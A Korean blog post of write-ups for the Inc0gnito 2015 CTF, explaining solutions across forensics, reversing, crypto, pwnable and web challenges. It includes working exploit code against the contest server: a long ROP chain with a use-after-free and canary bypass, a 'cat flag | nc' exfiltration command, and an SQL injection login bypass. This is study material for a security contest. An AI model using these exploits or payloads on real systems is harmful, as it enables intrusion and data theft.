---
layout: post
title: Inc0gnito 2015 CTF Writeups
---

### [Forensic] old_school

주어진 파일은 disk dump입니다. R-Studio 등의 복구 소프트웨어로 열어보면, 37byte 크기의 flag.txt가 있지만, 읽을 수 있는 형태로 복구되지는 않습니다. File system상에서의 연결이 깨진 것으로 생각했고, 37byte 크기의 모든 txt파일을 스캔해 보니 flag를 발견했습니다.

### [Network] 네트워크 관리자의 단말기를 해킹하자

주어진 파일은 pcap 파일과 실행중인 VMWare VM입니다. 스크린샷으로 보건대 VM 안에 flag파일이 들어 있었으나 현재는 지워진는 것으로 예상했습니다. VM의 snapshot이 존재하기에 파일을 로드했으나 지운 직후에 만들어진 snapshot이라 생각했고, memory dump에서 `Flag`로 검색한 결과 `TheFlagIs_MELONAC11NRNR0UL5MELON`라는 문자열을 발견했습니다. flag는 `MELONAC11NRNR0UL5MELON`입니다.

### [Network] 네트워크 해킹은 쉽군

주어진 파일은 pcap 파일입니다. Wireshark 등 소프트웨어로 열어보면 다양한 프로토콜의 트래픽이 잡히나 대부분 HTTPS이고, HTTP로 블로그에 접속한 트래픽이 간간히 보입니다. 이 중 [한 페이지](http://lonnia.tistory.com/71)에 접속해보면 단문의 포스트에 `KRUGS42JONKGQZKGNRQWOX3RNR3WW2TSMVWGWMTKGNWGWNBSMY4TQZRXMFZWIZTE`라는 문자열이 주어지며, 이를 base32로 디코드하면 `ThisIsTheFlag_qlwkjrelk2j3lk42f98f7asdfd`가 됩니다. flag는 `qlwkjrelk2j3lk42f98f7asdfd`입니다.

### [Reversing] Inside Out

주어진 파일은 Windows executable입니다. Data section을 잘 살펴보면 `\x7D\x40\x42\x06\x43\x48\x42\x45\x01\x49\x6C\x3E\x5F\x2D\x55\x5D\x46\x5A\x27\x58\x52\x4B\x7A\x61\x4E\x71\x50\x48\x7F\x65\x6E\x64\x6D\x57\x68\x40\x5A\x6B\x76\x70\x72`라는 수상한 문자열이 있습니다. 이 문자열의 XRef에 있는 함수를 분석하면 문자열의 i번째 문자를 문자열의 길이 - i와 xor해서 저장하는 코드가 있고, 실제로 xor를 해보면 `The flag is B1NG_B0NG_is_a_Friend_oF_ours`라는 문자열이 나옵니다. flag는 `B1NG_B0NG_is_a_Friend_oF_ours`입니다.

### [Reversing] Panic

주어진 파일은 Windows driver 파일입니다. kbdclass에 등록하는것으로 보아 키보드 드라이버임을 알 수 있으며, 잘 분석해 보면 원래의 키보드 드라이버를 복사해온 뒤 어떤 callback 함수를 my_callback으로 덮어씌웁니다. 이를 종합해 keyboard에서 발생하는 각 key event를 후킹하는 드라이버인 것으로 판단되었고, my_callback에서 인자를 변환한 뒤 전역변수에 있는 특정 값과 비교하는 것을 볼 때 올바른 35글자를 입력하면 될 것으로 보였습니다. my_callback을 분석해 전역변수의 35바이트를 역변환한 뒤 이를 keyboard scan code에서 찾아 원래의 flag를 구했습니다. flag는 적어놓지 않았습니다.

### [Reversing] reversing

다음 명령어로 flag를 찾았습니다.

```sh
strings reversing_96f6bbd153e2f091fe9b514caa16429edc2364cc.exe | grep KEY
```

flag는 `KACde45f`입니다.

### [Reversing] 멘붕에 빠진 개발이

주어진 파일은 windows executable입니다. import하는 library function 중 winsock에 사용되는 WSAStartup, WSACleanup 등이 있었고 문제 설명과 종합해 이 서버로 키를 보내는 데 winsock을 사용한다고 추정했습니다. 이들 함수들의 XRef에서 user code를 찾았고, IP 주소와 ID를 입력하는 부분을 패치해서 실행하니 flag가 나왔습니다. flag는 `335451514`입니다.

### [Reversing] Anti Hexray

주어진 파일은 Linux Executable입니다. 분석해 본 결과 프로그램의 첫 번째 인자로 주어진 문자열과 flag를 비교해 일치하면 Exit Code 0을, 일치하지 않으면 Exit Code 1을 리턴합니다. 이 때 주어진 문자열의 길이만큼만을 memcpy로 비교하기 때문에 flag를 첫 바이트부터 brute-force하면 각 바이트당 256번의 시도만으로 flag를 알아낼 수 있습니다. /tmp의 권한이 제대로 설정되어 있지 않아 exploit code를 다른 팀에 노출하지 않기 위해 다음 명령을 반복해서 실행해 flag를 추출했습니다.

```sh
python -c "import string, os; print ''.join(['' if os.system('./anti_hexray \"%s\"' % i) else i for i in string.printable])" 2>/dev/null
```

flag는 "IcEwAll&Inc0gnito"입니다.

### [Crypto] WhoAreYou?

서버에 접속하면 어떠한 수 p와 q를 정해놓고 plain을 p로 나눈 나머지에 랜덤한 p의 배수를 더한 값과, plain을 q로 나눈 나머지에 랜덤한 q의 배수를 더한 값을 수을 받을 수 있습니다. p와 q를 알 수 없으므로 plain을 알아낼 수 없는데, p와 q가 일정하다면 여러번에 시행에 대해 첫 번째 수를 p로 나눈 나머지와 두 번째 수를 q로 나눈 나머지는 각각 plain % p와 plain % q로 일정함을 알 수 있습니다. 때문에 첫 번째 수들의 차와 두 번째 수들의 차는 각각 p와 q의 배수가 되고, 이들 차들의 greatest common divisor를 구하면 p와 q가 나올 확률이 매우 높습니다.

올바른 p와 q를 구했다고 가정하면, 우리는 plain % p와 plain % q를 알고 있습니다. 여기에 Chinese remainder theorem을 적용하면 plain % (p * q)를 구할 수 있으며, 이것이 답일 가능성이 매우 높습니다. 실제로 이 값을 문자열로 변환하니 `Flag{Your_name_is_Onodera_Kosaki!}`가 나왔습니다.

다음은 exploit code입니다.

```python
import pwnbox
import string

ps = []
qs = []

for i in range(20):
    pipe = pwnbox.pipe.SocketPipe('ssh.inc0gnito.com', 64522)
    t = pipe.read()
    kp = int(t.split(',')[0])
    kq = int(t.split(' ')[1])
    ps.append(kp)
    qs.append(kq)
    pipe.close()
    print ''

ps = [abs(ps[0] - i) for i in ps[1:]]
while 1 < len(ps):
    ps = [pwnbox.number.gcd(ps[0], i) for i in ps[1:]]

qs = [abs(qs[0] - i) for i in qs[1:]]
while 1 < len(qs):
    qs = [pwnbox.number.gcd(qs[0], i) for i in qs[1:]]

p = ps[0]
q = qs[0]

kp = kp % p
kq = kq % q

print kp, p
print kq, q

plain = pwnbox.number.ChineseRemainderTheorem([kp, kq, ord('}')], [p, q, 256])
print hex(plain)
print hex(plain)[2:-1].decode('hex')
```

flag는 `Flag{Your_name_is_Onodera_Kosaki!}`입니다.

### [Reversing] cryptoworld

주어진 executable은 TCP 서버로, 랜덤한 길이와 내용의 4바이트 정수 배열을 알아맞춰야 합니다. 데이터를 수정하는 과정은 다음과 같습니다.

- 4바이트 정수 배열 D, 랜덤한 4바이트 정수 V
- D[i] = bit_rotate_right(D[i], V % 32)
- sum += D[i]
- D[i] ^= V

이후 D의 모든 내용과 sum이 TCP socket을 통해 주어집니다.

sum은 D의 값에 V를 xor하기 전의 합입니다. 따라서 올바른 V를 구한다면 TCP socket을 통해 받은 D의 값에 V를 xor한 뒤 더했을 때 sum과 같아 야 합니다. 이를 이용해 V의 값을 brute-force했는데, space가 2^32로 executable에 주어진 5초 이내에 결과가 나오기 어렵습니다. 그런데 D의 길이 V에서 3비트를 추출해 정해지므로 V의 3비트를 알 수 있으며, 이에 따라 줄어든 space인 2^29는 수 초 이내에 brute-force할 수 있는 크기입니다.

Brute-force는 구현은 간단하나 고성능의 처리가 필요한 부분으로 C++로 작성한 뒤 g++ -O4로 컴파일해 따로 실행했습니다. 다음은 exploit code입니다.

```python
import pwnbox

pipe = pwnbox.pipe.SocketPipe('ssh.inc0gnito.com', 9922)
prog = pwnbox.pipe.ProcessPipe('./ex')

data = pipe.read()
data = [pwnbox.utils.ltoi(data[i:i+4]) for i in range(0, len(data), 4)]

sums = pipe.read()
sums = pwnbox.utils.ltoi(sums)

print ''

prog.write_line(str(len(data)))
for i in data:
    prog.write_line(str(i))
prog.write_line(str(sums))

mask = int(prog.read_line())

s = 0
a = ''
for i in range(len(data)):
    data[i] ^= mask
    s += data[i]
    data[i] = (data[i] << (mask & 0x1f)) | (data[i] >> (32 - (mask & 0x1f)))
    data[i] &= 0xffffffff
    a += pwnbox.utils.dtol(data[i])

pipe.write(a)
pipe.read()
```

flag는 `Th3_Crypt0_Rev3rs1ng_M4gic1an`입니다.

### [Pwnable] TODO List

주어진 파일은 PIE와 stack guard가 적용된 Linux executable입니다. Fork를 이용한 TCP server가 구현되어 있으며, 0x002503이 handler function입니다. 이 함수를 분석하면 todo와 subtodo를 관리하는데, todo는 single-way linked list를 이용해서 관리하며, subtodo는 각 todo에 pointer array를 잡아서 관리함을 알 수 있습니다.

Exploitable한 취약점이 없는것으로 보이나, todo를 delete하는 부분에 index로 0이 들어갈 수 있다는 취약점이 있습니다. 0번 todo를 delete하게 되면 linked list의 head에 해당하는 node가 제거되는데, 이 직후 각 node의 크기에 해당하는 0x28바이트 크기의 메모리를 다시 malloc으로 할당받으면 기존 head node의 위치에 할당되어 use after free 취약점을 trigger할 수 있습니다. 각 node에는 해당 node를 print할 때 사용되는 function의 pointer가 저장되어 있는데, head node의 function pointer 값을 수정하여 trigger하면 rip를 control 할 수 있으나 head node 는 print될 수 없다는 문제가 있습니다. Head node를 가리키는 포인터는 0x2062f8에 저장되어 있는데, Head node의 next node pointer를 0x2062f8을 next pointer로 하도록 전역변수 영역에 지정하면 head node의 다음 다음 node, 즉 2번 노드 역시 head node가 되어 head node의 print function을 trigger할 수 있습니다.

문제는 executable에 PIE가 적용되어 있어 전역변수임에도 정확한 주소를 알 수 없다는 점입니다. 따라서 executable의 주소에 대한 leak을 찾아야 하는데, 사용자 이름을 입력받고 다시 출력할 때 null character 처리를 하지 않습니다. 따라서 buffer의 크기인 3000바이트를 \x00이 아닌 character로 꽉 채우면 buffer 바로 다음 위치의 값이 입력한 이름에 덧붙어 출력되며, 바로 다음 위치가 에러메시지의 포인터를 저장하는 변수이므로 미리 에러메시지를 설정하고 사용자 이름을 변경하면 해당 포인터값을 얻을 수 있습니다. 그 결과 알아낸 executable의 base address는 0x7effff969000입니다. 서버는 fork를 통해 실행되므로 이 값은 바뀌지 않습니다.

이제 위에서 설명한 방법대로 rip를 control할 수 있는데, 원하는 기능을 process상에서 실행하기 위한 가장 편리한 방법은 return oriented programming입니다. 이를 위해서는 rsp가 ROP payload에 설정되어 있는 상태로 rip를 ret instruction으로 옮기면 되는데, 현재 메모리에서 control 가능한 부분은 heap과 사용자 이름이 들어가는 stack뿐입니다. 정황상 현재 rsp와 사용자 이름의 영역이 큰 차이가 나지 않기 때문에 add rsp gadget을 이용하고자 했으며, 0x001d5f에 위치한 다음의 gadget을 실행하면 rsp가 정확히 사용자 이름이 위치한 부분에 위치하게 됩니다.

```asm
add 0x2c8, %rsp
pop %rbx
pop %rbp
ret
```

이제 ROP는 가능하나 fork, execve, prctl system call이 차단되어 shell command를 실행하기는 어려운 상황입니다. 그런데 executable에는 MySQL DB에 message를 보내는 기능이 있고, fork한 process 중 하나가 이 message를 출력한 뒤 DB에서 삭제합니다. 이 logger process에는 예의 system call들이 차단되어 있지 않으므로, 조작된 message를 DB에 삽입하여 logger process를 exploit한 뒤 remote shell을 실행하는 방법을 사용하기로 했습니다.

Message의 길이는 511바이트로 제한되어 있고, logger process의 message buffer 역시 stack에 비슷한 크기로 할당되어 있기 때문에 이보다 긴 message를 DB에 집어넣을 수 있다면 logger process에서 buffer overflow를 trigger할 수 있고, 이를 통해 eip를 control할 수 있으며 간단히 ROP가 가능합니다. ROP payload까지 고려하면 충분히 긴 길이의 message를 DB에 넣을 방법을 찾아야 합니다.

짧은 payload의 경우에는 임의의 stack 또는 heap 지역이나 executable의 BSS section 등을 활용할 수 있으나 긴 payload를 전송하기 위해서는 별도의 할당된 영역이 필요합니다. malloc을 이용해 heap을 할당받거나 mmap을 통해 메모리를 할당하면 되는데, malloc의 경우에는 return value를 다시 받아와야 한다는 불편함이 있어 mmap을 통해 임의의 주소를 갖는 메모리를 할당받아 message를 전달하고자 했습니다. 먼저 GOT 영역에 주소가 저장된 함수를 이용하기 위해 0x00314a과 0x003130에 위치한 magic gadget을 사용했고, GOT가 0x205060에 위치한 write 함수를 호출해 임의의 메모리 값을 읽었습니다. GOT 영역의 값을 읽어 __libc_start_main, __stack_chk_fail 등 libc 함수의 주소를 얻었고 이를 libc library에서 대조해 fingerprint가 일치하는 libc-2.19.so를 확보했습니다. 결과 libc의 base address는 0x7efffea12000임을 알았으며 libc의 모든 값을 자유롭게 이용할 수 있게 되었습니다.

mmap함수는 6개의 argument를 활용하나, Linux x86_64 calling convention에서 5번째와 6번째 argument를 원하는 값으로 채울 수 있는 gadget을 찾는 것은 거의 불가능에 가까웠습니다. 따라서 사용되지 않는 임의의 지역에 mprotect를 호출해 write/execute 권한을 부여한 뒤, argument로 사용되는 6개의 argument를 채워 넣는 gadget를 써 넣고 사용했습니다. 해당 gadget의 내용은 다음과 같습니다.

```asm
pop %rdi
pop %rsi
pop %rdx
pop %rcx
pop %r8
pop %r9
ret
```

이제 임의의 길이의 message가 포함된 query를 mmap으로 할당한 구역에 써 넣고 mysql_real_query를 호출하면 logger process로 payload를 보낼 수 있게 되었습니다. Buffer overflow를 trigger해 ROP를 하기 위해서는 stack guard를 우회해야 하며, 이를 위해 원래의 process에서 canary 값을 추출해 ROP payload에 집어넣어 stack guard가 발동되지 않도록 했습니다. 이는 stack canary가 모든 함수에서 동일하며, logger process 역시 fork로 실행되기 때문에 가능합니다. 이제 ROP는 가능하나 추가적인 payload를 집어넣을 수 없어 쉘을 띄울 수 없었으므로 memcpy 함수를 이용해 원하는 payload를 메모리에 생성하는 code를 ROP로 작성했고, 원하는 shell command를 system 함수로 실행할 수 있게 되었습니다.

정상적으로라면 `cat flag | nc myserver.com 10000` 와 같은 식으로 원하는 shell command를 실행하고 그 결과를 받아볼 수 있어야 하나 일정 길이 이상의 query문이 mysql_real_query 함수에서 실행되지 않는 문제가 있었습니다. 이를 디버그해서 해결하는 대신 anti_hexray, NTmaze 등 문제와 같은 서버를 사용한다는 점을 이용, `/tmp/t` 등에 다음과 같은 shell script를 작성하고 이를 executable에서 실행하게 함으로써 shell command의 결과를 확인했습니다.

```sh
#!/bin/sh
ls -al > /tmp/s
```

확인 결과 `flag`는 executable도 읽기 권한이 없었지만 `get_flag`에 setuid가 걸려 있어 `./get_flag flag`와 같이 읽을 수 있었습니다. 다음은 exploit code입니다.

```python
import pwnbox
from pwnbox.utils import qtol, ltoi

todo = 'BBBB'

base = 0x7effff969000
libc_base = 0x7efffea12000
head = base + 0x2062f8
addrsp = base + 0x1d5f
ret = base + 0x3154
bss = base + 0x2062fc
canary = 0x53c6318b9862c200

bss &= 0xfffffffff000

def regs(rdi, rsi, rdx):
    pay = ''
    pay += qtol(libc_base + 0x108169)
    pay += qtol(rdx)
    pay += qtol(rsi)
    pay += qtol(base + 0x3153)
    pay += qtol(rdi)
    return pay

def regs2(rdi, rsi, rdx, rcx, r8, r9):
    pay = ''
    pay += qtol(bss)
    pay += qtol(rdi)
    pay += qtol(rsi)
    pay += qtol(rdx)
    pay += qtol(rcx)
    pay += qtol(r8)
    pay += qtol(r9)
    return pay

buf = 0x7effffc97360

def call(func, rdi, rsi, rdx):
    pay = ''
    pay += qtol(0x314a + base)
    pay += qtol(0)
    pay += qtol(1)
    pay += qtol(func + base)
    pay += qtol(rdx)
    pay += qtol(rsi)
    pay += qtol(rdi)
    pay += qtol(0x3130 + base)
    pay += 'A' * 8 * 7
    return pay

with open('libc-2.19.so', 'rb') as f:
    lb = f.read()

get_canary = "\x64\x48\x8B\x04\x25\x28\x00\x00\x00\x48\xA3\xFC\xF2\xB6\xFF\xFF\x7E\x00\x00\xC3"
sc1 = "\x5F\x5E\x5A\x59\x41\x58\x41\x59\xC3"
sc2 = "/tmp/f"

log = 'C' * 520
log += qtol(canary)
log += qtol(ret) * 4
for i in range(len(sc2)):
    log += regs(bss + i, libc_base + lb.index(sc2[i]), 1)
    log += qtol(base + 0x1390)
log += regs(bss, 0, 0)
log += qtol(libc_base + 0x46640)

query = 'INSERT INTO messages(message) VALUES (\'%s\')' % log

pay = ''
pay += regs(bss, 4096, 7)
pay += qtol(libc_base + 0xf4a20)
pay += call(0x2050c0, 0, bss, len(sc1))
pay += call(0x205060, 1, bss, len(sc1))
pay += regs2(0x400000, 0x4000, 7, 50, -1, 0)
pay += qtol(libc_base + 0xf49c0)
pay += regs(0x400000, len(query), 0)
pay += qtol(base + 0x1888)
pay += call(0x205060, 1, 0x400000, len(query))
pay += qtol(base + 0x17cc)
pay += regs(0x7effffb6ee00, 0x400000, len(query))
pay += qtol(base + 0x1420)

pipe = pwnbox.pipe.SocketPipe('ssh.inc0gnito.com', 32323)
pipe.read_line(4)

pipe.read_line(14)
pipe.write('1')
pipe.read_line(2)
pipe.write(qtol(3000))
pipe.write(qtol(ret) * ((3000 - len(pay)) / 8) + pay)
pipe.read_until('1. Login')

pipe.read_line(14)
pipe.write('3')
pipe.read_until(': ')
pipe.write(qtol(len(todo)))
pipe.write(todo)
pipe.read_until('success\n')

pipe.read_line(14)
pipe.write('5')
pipe.read_until('delete\n')
pipe.write(qtol(0))
pipe.read_until('success\n')

pipe.read_line(14)
pipe.write('4')
pipe.read_until('contents\n')
pipe.write(qtol(1))
pipe.read_until('content\n')
pipe.write(qtol(39))
pipe.read_until('content\n')
pipe.write('C' * 8 + qtol(addrsp) + 'D' * 16 + qtol(head - 0x20)[:7])
pipe.read_until('success\n')

pipe.read_line(14)
pipe.write('C')
pipe.write(qtol(2))
pipe.read_line()

pipe.write(sc1)
pipe.read_byte(len(sc1))
pipe.write(query)
pipe.read_byte(len(query))
pipe.interact()
```

Flag는 적어놓지 않았습니다.

### [Web] 카카오프렌즈와 문제 풀기

웹 사이트에 접속하면 로그인 화면이 뜹니다. ID에 `' or id='admin'#`으로 SQL injection을 시도하니 admin 계정으로 로그인이 되었습니다.

로그인하니 게시판이 뜹니다. 각 게시물에는 첨부파일이 있는데 이 `http://ssh.inc0gnito.com:9888/board\_download.php?num=5`와 같은 첨부파일 url의 num parameter에 SQL injection을 시도했습니다. Error 발생을 체크하며 `5 union select 1, 1, 1`과 같은 방법으로 query의 column이 2개임을 알아냈고, 두 번째 column이 첨부파일의 경로임을 알았습니다. 경로를 조작해 게시판 화면에서 Answer을 검사하는 auth.php를 다운받으니 Answer를 `muzi`와 비교함을 알 수 있었습니다. flag는 `muzi`입니다.

### [Reversing] CFT

주어진 파일은 Android APK입니다. 이를 decompile하면 간단한 Android application과 libvaccine이라는 native library가 있습니다. Android application은 `\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f`라는 문자열과 그 길이를 argument로 libvaccine의 vaccine 함수를 호출하며, JNI로 작성된 libvaccine의 vaccine 함수는 argument로 전달받은 문자열을 `\x1e\x14\x19\x1f\x42\x11\x19\x15\x19\x0b\x0c\x0d\x1c\x1d\x16\x1c`과 xor한 뒤 리턴합니다. Android application의 resource 중 `xxxxxxxxxxxxxxxx`라는 문자열이 있어 이를 `\x1e\x14\x19\x1f\x42\x11\x19\x15\x19\x0b\x0c\x0d\x1c\x1d\x16\x1c`과 xor한 결과 `flag:iamastudent`가 나왔습니다. flag는 `iamastudent`입니다.
